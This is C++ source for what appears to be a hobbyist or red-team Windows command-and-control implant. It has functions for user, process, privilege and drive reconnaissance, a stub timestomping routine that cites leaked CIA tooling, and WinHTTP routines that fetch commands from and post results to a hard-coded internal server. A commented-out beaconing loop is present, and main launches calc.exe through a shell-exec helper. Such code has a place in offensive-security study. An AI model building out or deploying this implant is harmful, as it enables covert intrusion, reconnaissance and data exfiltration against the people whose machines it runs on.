#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <iostream>
#include <cstdlib>
#include <string>
#include <Psapi.h>
#include <atlconv.h>
#include <winhttp.h>
#include <sstream>
#include "CodeExecution.h"
#pragma comment(lib, "winhttp.lib")

std::string whoami()
{
	TCHAR computername[UNLEN + 1];
	DWORD computername_len = UNLEN + 1;
	GetComputerName(computername, &computername_len);

	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	
	std::wstring computername_w(computername);
	std::string computername_s(computername_w.begin(), computername_w.end());
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	std::string output = computername_s + "\\" + username_s;
	return output;
}


void pwd()
{
	TCHAR directory[UNLEN + 1];
	DWORD directory_len = UNLEN + 1;
	GetCurrentDirectory(directory_len, directory);
	std::wcout << directory << "\n";
}

// https://stackoverflow.com/questions/7011071/detect-32-bit-or-64-bit-of-windows
DWORD osarch()
{
	DWORD NativeArch = PROCESSOR_ARCHITECTURE_INTEL; //assume 32 bit, if following checks fail it is 32 bit
	SYSTEM_INFO SystemInfo = { 0 };
	HINSTANCE hKernel = LoadLibraryA("kernel32.dll");
	
	if (!hKernel) //check kernel32 was loaded
		return NativeArch;
	FARPROC pGetNativeSystemInfo = GetProcAddress( hKernel, "GetNativeSystemInfo");
	if (!pGetNativeSystemInfo) //check that getnativesysteminfo exists
		return NativeArch;
	GetNativeSystemInfo(&SystemInfo);
	switch (SystemInfo.wProcessorArchitecture)
	{
		case PROCESSOR_ARCHITECTURE_AMD64:
			NativeArch = PROCESSOR_ARCHITECTURE_AMD64;
			break;
		case PROCESSOR_ARCHITECTURE_IA64:
			NativeArch = PROCESSOR_ARCHITECTURE_IA64;
			break;
		case PROCESSOR_ARCHITECTURE_INTEL:
			NativeArch = PROCESSOR_ARCHITECTURE_INTEL;
			break;
		default:
			NativeArch = PROCESSOR_ARCHITECTURE_UNKNOWN;
			break;
	}
	FreeLibrary(hKernel); //loadlibrary closed by freelibrary
	return NativeArch;
}

void ps_arch_print(HANDLE hProcess)
{
	BOOL wow64process;
	IsWow64Process(hProcess, &wow64process);
	if (osarch() == PROCESSOR_ARCHITECTURE_INTEL)
	{
		std::wcout << "Arch: x32     ";
	}
	else
	{
		if (wow64process)
			std::wcout << "Arch: x32     ";
		else
			std::wcout << "Arch: x64     ";
	}
	
}

//https://docs.microsoft.com/en-us/windows/desktop/toolhelp/taking-a-snapshot-and-viewing-processes
void ps()
{
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if (Process32First(hProcessSnap, &pe32) == TRUE)
	{
		while (Process32Next(hProcessSnap, &pe32) == TRUE)
		{
			MODULEENTRY32 me32;
			me32.dwSize = sizeof(MODULEENTRY32);
			HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
			Module32First(hModuleSnap, &me32);

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID); //handle to current process
			char full_path[UNLEN + 1];
			DWORD full_path_len = UNLEN + 1;

			if (pe32.th32ProcessID == me32.th32ProcessID) //ensure pe + me struct agree on PID
			{
				ps_arch_print(hProcess);
				std::wcout << "PID: " << pe32.th32ProcessID << "     PPID: " << pe32.th32ParentProcessID << "     EXE: " << me32.szExePath << "\n";
			}
			else
			{
				if (GetProcessImageFileNameA(hProcess, full_path, full_path_len)) //can we query file name?
				{
					ps_arch_print(hProcess);
					std::wcout << "PID: " << pe32.th32ProcessID << "     PPID: " << pe32.th32ParentProcessID << "     EXE: " << full_path << "\n";
				}
				else //fall back to just exe no path
				{
					ps_arch_print(hProcess);
					std::wcout << "PID: " << pe32.th32ProcessID << "     PPID: " << pe32.th32ParentProcessID << "     EXE: " << pe32.szExeFile << "\n";
				}
				
			}
			CloseHandle(hModuleSnap);
		}
		CloseHandle(hProcessSnap);
	}
}

//https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-setcurrentdirectory
//https://stackoverflow.com/questions/1200188/how-to-convert-stdstring-to-lpcstr
void cd()
{
	std::string directory;
	std::getline(std::cin, directory);
	SetCurrentDirectoryA(directory.c_str());
}

//https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-copyfile
void cp()
{
	std::string src_file;
	std::getline(std::cin, src_file);
	std::string dest_file;
	std::getline(std::cin, dest_file);
	CopyFileA(src_file.c_str(), dest_file.c_str(), FALSE);
}

//https://superuser.com/questions/231273/what-are-the-windows-a-and-b-drives-used-for
void drives()
{
	std::string alphabet[26] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
	DWORD drives_bit = GetLogicalDrives();
	int count = 0;
	while (count < 32)
	{
		if (drives_bit & 0x01) //checks least significant bit
		{
			printf("%s:\\\n", alphabet[count]);
		}
		count++; //iterate through dword
		drives_bit = drives_bit >> 1; //right shift 
	}
}

//https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
//https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ne-winnt-_token_information_class
//https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-_token_privileges
//https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-_luid_and_attributes
//https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-lookupprivilegenamea
void privs()
{
	HANDLE hToken; //or skip OpenProcessToken() below and use  -> HANDLE hToken = GetCurrentProcessToken();
	TOKEN_PRIVILEGES ptp[UNLEN];
	DWORD token_info_len = UNLEN + 1;
	DWORD return_len = UNLEN + 1;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //instead of HANDLE hToken = GetCurrentProcessToken();
		std::wcout << "OpenProcessToken() success!\n";
	if (GetTokenInformation(hToken, TokenPrivileges, &ptp, token_info_len, &return_len)) //obtain token information, output number of privileges
	{
		std::wcout << "GetTokenInformation() success!\n";
		std::wcout << "There are " << (*ptp).PrivilegeCount << " privileges.\n\n";
	}
		
	for (int x = 0; x <= (*ptp).PrivilegeCount-1; x++) //loop through LUID_AND_ATTRIBUTES structure
	{
		LUID luid = (*ptp).Privileges[x].Luid;
		char lpName[MAX_PATH];
		DWORD cchName = UNLEN + 1;
		if (LookupPrivilegeNameA(NULL, &luid, lpName, &cchName))
		{
			std::wcout << lpName << "\n";
		}
		else
		{
			std::wcout << "GetLookupPrivilegeNameA() failure :(\n";
			std::wcout << "Error: " << GetLastError() << "\n\n";
		}
	}
}

//https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea
//https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-_win32_find_dataa
//https://docs.microsoft.com/en-us/windows/desktop/fileio/listing-the-files-in-a-directory
void ls()
{
	std::string directory;
	WIN32_FIND_DATAA w32fd; //define structure that holds file data
	std::wcout << "Directory or file: ";
	std::getline(std::cin, directory);
	HANDLE hSearch = FindFirstFileA(directory.c_str(), &w32fd); //create search handle

	if (hSearch != INVALID_HANDLE_VALUE) //check search handle created successfully
	{
		std::wcout << "FindFirstFileA() success!\n\n";
		std::wcout << "Directory of " << directory.c_str() << "\n";
	}
	else if(hSearch == INVALID_HANDLE_VALUE) //print error
	{
		std::wcout << "Invalid handle value.\n";
		std::wcout << "System Error Code: " << GetLastError() << "\n";
		return;
	}
	
	
	do 
	{
		DWORD filesize;
		FILETIME ft = w32fd.ftLastAccessTime;
		SYSTEMTIME st;

		//calculate last access time, write to stdout
		FileTimeToSystemTime(&ft, &st);
		std::wcout << st.wMonth << "/" << st.wDay << "/" << st.wYear << " " << st.wHour << ":" << st.wMinute << " ";

		//write filename
		std::wcout << w32fd.cFileName << " ";

		//calculate filesize in bytes, write to stdout
		if (w32fd.nFileSizeHigh == NULL) //check high order value of filesize, is 0 if filesize < MAXDWORD
			filesize = w32fd.nFileSizeLow;
		else
			filesize = (w32fd.nFileSizeHigh * (MAXDWORD + 1)) + w32fd.nFileSizeLow;
		if (filesize)
			std::wcout << filesize << " bytes ";

		//write newline
		std::wcout << "\n";
	} while (FindNextFileA(hSearch, &w32fd)); //loop through until FindNextFileA() returns 0		
}

//https://wikileaks.org/ciav7p1/cms/page_15729502.html
/*
-c (Sets Create Time)
-m(Sets Last Write Time)
- a(Sets Last Access Time)
- t(Date / Time String)
- rt(Date Range)
- p(Path to a file or directory)
*/
void stomp(int argc, char **argv)
{
	//take from TimeStomper project
}



std::string agent_get()
{
	std::string agent_return;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, L"10.93.3.196",
			8080, 0);

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);

	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	printf("GET request sent\n");

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			// Read the Data.
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				printf("Server Response: %s\n", pszOutBuffer);
				if (strcmp(pszOutBuffer, "whoami") == 0)
				{
					agent_return = whoami();
				}
			}

			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return agent_return;
}

void agent_post(std::string output)
{
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, L"10.93.3.196",
			8080, 0);

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"POST", NULL,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);
	
	// Send a request.
	LPSTR  data = const_cast<char *>(output.c_str());;
	DWORD data_len = strlen(data);
	DWORD headersLength = -1;
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, headersLength,
			data, data_len,
			data_len, 0);
	printf("POST request sent\n");

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			// Read the Data.
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				printf("Server Response: %s\n", pszOutBuffer);
			}

			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

int main(int argc, char **argv)
{
	/*
	DWORD sleep_time = 5000; //ms
	while (true)
	{
		string output = agent_get();
		//cout << output << endl;
		agent_post(output);
		printf("Sleep for %i seconds\n\n", sleep_time/1000);
		Sleep(sleep_time);
	}
	*/
	std::string test = shell_exec("cmd.exe /c calc.exe");
	std::cout << test;
	
	

	std::cin.get();
	return 0;
}

